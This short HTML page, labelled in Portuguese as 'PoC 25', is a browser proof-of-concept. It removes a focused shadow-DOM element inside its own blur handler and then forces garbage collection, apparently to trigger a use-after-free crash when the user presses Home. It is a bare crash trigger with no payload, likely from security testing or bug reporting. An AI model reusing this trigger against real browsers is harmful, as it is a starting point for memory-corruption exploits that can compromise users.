<!DOCTYPE html>
<html>
<body>
<p>PoC 25 - kill no blur do elemento</p>
<div id="host"></div>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 30000; i++) gcRec(15);
    var junk = [];
    for (var i = 0; i < 100; i++) junk.push(new ArrayBuffer(2 * 1024 * 1024));
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable - aperte Home';
shadowRoot.appendChild(victim);

victim.addEventListener('blur', function() {
    this.remove();
    victim = null;
    gc();
}, true);

victim.focus();
result.textContent = 'Aperte Home agora';
</script>
</body>
</html>
